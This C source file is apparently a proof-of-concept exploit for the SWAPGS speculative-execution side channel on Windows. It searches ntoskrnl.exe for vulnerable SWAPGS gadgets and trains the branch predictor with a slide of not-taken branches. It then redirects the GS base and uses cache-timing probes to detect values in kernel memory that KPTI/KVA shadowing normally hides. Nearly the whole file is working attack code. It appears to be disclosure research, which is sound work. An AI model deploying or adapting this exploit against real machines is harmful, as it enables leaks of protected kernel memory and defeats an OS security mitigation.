/* SPDX-License-Identifier: BSD-3-Clause */
#include <windows.h>
#include <stdio.h>

typedef UINT64 QWORD;

extern unsigned long long AsmTestAccessTime(PBYTE Address);
extern unsigned long long AsmRdrand();
extern unsigned long long AsmRdgsbase();
extern void AsmWrgsbase(QWORD Value);
extern void AsmSpeculateSwapgs(QWORD KernelAddress, PBYTE Branches);



// Each byte is 0/1, and it indicates whether any victim branch is located at the given offset inside the kernel page.
// We will use this to generate branches which are not taken, in order to hopefully confuse the CPU branch predictor
// into thinking the branch right before the SWAPGS is not taken. This will trigger
BYTE gBranchMask[4096] = { 0 };

QWORD gBranchAddress = 0;
QWORD gKvaShadowAddress = 0;
QWORD gKernelBase = 0;

#define ITERATIONS 50

// Most of the kernel modules start with this QWORD value (page-aligned). Changing this to another value (ie, a value
// that is not located at the kernel address that we probe) will cause the memory access inside our buffer to never
// take place.
#define MZPE_QWORD_SIGNATURE            0x0000000300905A4D    // MZ\x90\x00\x03\x00\x00\x00


enum
{
    SystemModuleInformation = 11,
};


typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE      Section;
    PVOID       MappedBase;
    PVOID       ImageBase;
    ULONG       ImageSize;
    ULONG       Flags;
    USHORT      LoadOrderIndex;
    USHORT      InitOrderIndex;
    USHORT      LoadCount;
    USHORT      OffsetToFileName;
    UCHAR       FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;


typedef struct _RTL_PROCESS_MODULES
{
    ULONG       NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[2];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;


typedef NTSTATUS
(WINAPI *PFUNC_NtQuerySystemInformation)(
    __in DWORD Class,
    __in PVOID Arg1,
    __in SIZE_T Size,
    __out PVOID Optional
    );

#define BRANCH_SIZE     (1 * 1024 * 1024)
#define LLC_SIZE        (8 * 1024 * 1024)
#define THASH_SIZE      (LLC_SIZE * 2)
#define SLIDE_SIZE      LLC_SIZE                    // 8 MB for the initial probing buffer, equal to the LLC size.
#define DECOY_SIZE      0x10000
#define DECOY_MASK      0xFFFFFFFFFFFF0000


//
// FindMZSignatueInKernelMemory
//
QWORD
FindMZSignatueInKernelMemory(
    __in QWORD Address,
    __in QWORD Value
    )
//
// Return the kernel address where it finds the searched value.
//
{
    QWORD i, v, gsbase, t, tries, rnd, tries_total = 0;
    LARGE_INTEGER t0, t1, tt, fr;

    tt.QuadPart = 0;

    QueryPerformanceFrequency(&fr);

    // Allocate memory, in user mode, at the address equal to the searched value. The idea is that the vulnerable code
    // sequence, once executed speculatively, will trigger random accesses to addresses equal to the value read from
    // that kernel address. If the value happens to be a valid user-mode address, we can allocate memory at that address
    // and see if an access is made inside our user mode memory. If an access is made, this means that the value read
    // from the kernel memory was accessed speculatively and it is within our allocated buffer (with a cache line bias)
    PBYTE pDecoy = VirtualAlloc((PVOID)(Value & DECOY_MASK), DECOY_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (NULL == pDecoy)
    {
        printf("[-] Failed allocating data at 0x%016llx: 0x%08x!\n", Value, GetLastError());
        return 0;
    }

    // Whatever can be stored there.
    memset(pDecoy, 0xCC, DECOY_SIZE);

    printf("[+] Allocated decoy buffer at 0x%016llx!\n", Value);


    // Allocate some memory used to store the conditional branches which we will use to confuse the branch predictor.
    // We must ensure we have good chances for the vulnerable branch to be mispredicted, which will lead to SWAPGS
    // being executed speculatively, which will trigger arbitrary addresses to be accessed speculatively.
    PBYTE pBranch = VirtualAlloc(NULL, BRANCH_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (NULL == pBranch)
    {
        printf("[-] Alloc failed for branch buffer: 0x%08x\n", GetLastError());
        return 0;
    }

    // Fill it with 0X90 (NOP) opcodes.
    memset(pBranch, 0x90, BRANCH_SIZE);

    // Regenerate the branch slide. Experimentally, I observed that there are high chances to trigger the gadget
    // to be speculatively executed if I generate a large (at least 16K) slide of random conditional branches.
    // If I place a branch that is not taken at a page offset equal to the page offset of the kernel branch seems
    // to also increase the chances of not taking the branch in kernel, leading to speculative SWAPGS execution.
    for (i = 0; i < BRANCH_SIZE / 0x1000; i++)
    {
        // Offset matches that of the branch in kernel, make it not taken, always, so we force a misprediction.
        pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 0] = 0x75;
        pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 1] = 0x03;

        if (i + 1 < BRANCH_SIZE / 0x1000)
        {
            // Place a jump to the next conditional branch; we don't want to waste too much time executing NOPs...
            pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 5] = 0xE9;
            pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 6] = 0xF0;
            pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 7] = 0x0F;
            pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 8] = 0x00;
            pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 9] = 0x00;
        }
    }

    pBranch[BRANCH_SIZE - 1] = 0xC3;

    printf("[+] Allocated branch buffer at 0x%018p\n", pBranch);

    //
    // Allocate a thrash buffer.
    //
    PBYTE pThrash = VirtualAlloc(NULL, LLC_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (NULL == pThrash)
    {
        printf("[-] Alloc failed for thrash buffer: 0x%08x\n", GetLastError());
        return 0;
    }

    memset(pThrash, 0, LLC_SIZE);

    // We need to old GS base, to restore it once we're done.
    gsbase = AsmRdgsbase();

    printf("[+] GS_BASE at 0x%016llx\n", gsbase);

    printf("=====================================================================================\n");
    printf("Checking for value 0x%016llx in kernel memory at address 0x%016llx...\n", Value, Address);
    printf("=====================================================================================\n");

    t = Address;
    tries = 0;
    rnd = 0;

    for (QWORD q = 0; q < 1000; q++)
    {
        QueryPerformanceCounter(&t0);

        while (TRUE)
        {
            tries++;

            // Flush out the KvaShadow variable by accessing as much memory as possible, at addresses which may conflict with the variable.
            for (DWORD k = 0; k < LLC_SIZE / 0x1000; k++)
            {
                pThrash[(k * 0x1000) + (gKvaShadowAddress & 0xFFF)]++;
            }

            // Flush the decoy. The kernel always accesses the address +0x220 (mov   rcx,qword ptr [rcx+220h])
            _mm_clflush((PBYTE)Value + 0x220);

            // Serialize.
            _mm_mfence();
            _mm_lfence();

            // Do the access. Note that the kernel accesses gs[0x188], so if we want to leak/probe address X, we need to
            // write X - 0x188 into the GS base.
            __try
            {
                AsmSpeculateSwapgs(t - 0x188, pBranch);
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
            }

            // Restore old GS base.
            AsmWrgsbase(gsbase);

            // Check out how long it takes to access the value we want to see if it's present inside the kernel. Usually,
            // a cached access will take well below 100 clock ticks, so this is good enough for the demo.
            v = AsmTestAccessTime((PBYTE)Value + 0x220);
            if (v < 100)
            {
                printf("[!] Success! Value 0x%016llx (with a cache line bias) was found at VA 0x%016llx !!!! Access time: %llu, tries %llu\n", Value, t, v, tries);
                //return t;
                tries_total += tries;
                tries = 0;
                //break;
            }

            _mm_lfence();
        }

        QueryPerformanceCounter(&t1);

        tt.QuadPart += t1.QuadPart - t0.QuadPart;
    }

    printf("It took %2.4f seconds to obtain the value, %d tries!\n", (tt.QuadPart / 1000) / (double)fr.QuadPart, tries_total / 1000);

    return 0;
}


//
// FindGadgetAddress
//
int
FindGadgetAddress(
    VOID
    )
//
// This function searches for the vulnerable gadgets inside the ntoskrnl.exe image, in order to ensure good chances
// of mispredicting the branch before the SWAPGS when we generate the random branches slide.
//
{
    DWORD count = 0;
    PFUNC_NtQuerySystemInformation NtQuerySystemInformation;
    RTL_PROCESS_MODULES modules;
    PBYTE hMod = (PBYTE)LoadLibraryA("ntoskrnl.exe");
    if (NULL == hMod)
    {
        printf("[-] Could not load the ntoskrnl.exe module: 0x%08x\n", GetLastError());
        return -1;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNth = (PIMAGE_NT_HEADERS)(hMod + pDos->e_lfanew);

    // Search for all the following squences:
    // f60552b4390001       test    byte ptr [nt!KiKvaShadow (fffff803`09c02840)],1
    // 7503                 jne     nt!KiInvalidOpcodeFault+0x73 (fffff803`098673f3)
    // 0f01f8               swapgs
    // 654c8b142588010000   mov     r10,qword ptr gs:[188h]
    for (DWORD i = 0; i < pNth->OptionalHeader.SizeOfImage - 10; i++)
    {
        if (hMod[i + 0] == 0xF6 &&              // test opcode
            hMod[i + 1] == 0x05 &&              // test modrm
            hMod[i + 6] == 0x01 &&              // test imm8
            hMod[i + 7] == 0x75 &&              // jne  opcode
            hMod[i + 8] == 0x03 &&              // jne  displacement
            hMod[i + 9] == 0x0F &&              // swapgs opcode
            hMod[i + 10] == 0x01 &&
            hMod[i + 11] == 0xF8)
        {
            count++;
            printf("[+] Branch address at offset 0x%016llx\n", i);
        }

        if (count == 25)
        {
            // The KiInvalidOpcodeFault handler contains the 43th SWAPGS instruction. Good enough for the demo LOL.
            gBranchAddress = i + 7;
            gKvaShadowAddress = *((DWORD*)(&hMod[i + 2])) + i + 7;
            printf("[+] Branch address at offset 0x%016llx\n", gBranchAddress);
            printf("[+] KvaShadow address at offset 0x%016llx\n", gKvaShadowAddress);
            break;
        }
    }

    // Lookup the NtQuerySystemInformation API inside ntdll.
    NtQuerySystemInformation = (PFUNC_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"),
        "NtQuerySystemInformation");
    if (NULL == NtQuerySystemInformation)
    {
        printf("[-] Failed locating NtQuerySystemInformation!\n");
        return -1;
    }

    // Lookup the address of system modules.
    NtQuerySystemInformation(SystemModuleInformation, &modules, sizeof(modules), NULL);

    // The first two modules will usually be the kernel and the hal.
    printf("[+] Found '%s' at 0x%016p\n", modules.Modules[0].FullPathName, modules.Modules[0].ImageBase);

    gKernelBase = (QWORD)modules.Modules[0].ImageBase;
    gBranchAddress += gKernelBase;
    gKvaShadowAddress += gKernelBase;

    FreeLibrary((HMODULE)hMod);

    return 0;
}


int main(int argc, char *argv[])
{
    QWORD kernelbase;
    DWORD thread_affinity = 0;

    printf("Usage: %s affinity\n", argv[0]);
    printf("Default affinity: 2\n");

    // We must run on the same CPU, to make sure we leak the same IA32_KERNEL_GS_BASE register.
    if (argc == 1)
    {
        // No argument, run on CPU 1. It seems that we have better chances of success if we don't run on the BSP.
        thread_affinity = 2;
    }
    else if (argc > 1)
    {
        // If an argument is specified, run on that specific CPU. We don't do any kind of checks to see the actual
        // number of CPUs in the system.
        thread_affinity = 1 << atoi(argv[1]);
    }

    //printf("[+] Will run with thread affinity 0x%x...\n", thread_affinity);

    //SetThreadAffinityMask(GetCurrentThread(), thread_affinity);

    // Setup the location of the vulnerable gadgets and the base address of the kernel. For the PoC, we simply show that
    // we can test the presence of the MZ signature inside the NT headers, a memory area which is not normally accessible
    // thanks to KPTI/KVA.
    if (0 != FindGadgetAddress())
    {
        printf("[-] Could not locate the offsets of the gadgets!\n");
        return -1;
    }

    kernelbase = FindMZSignatueInKernelMemory(gKernelBase, MZPE_QWORD_SIGNATURE);
    if (0 != kernelbase)
    {
        printf("[!] Found kernel base at 0x%016llx!\n", kernelbase);
    }

    getchar();

    return 0;
}
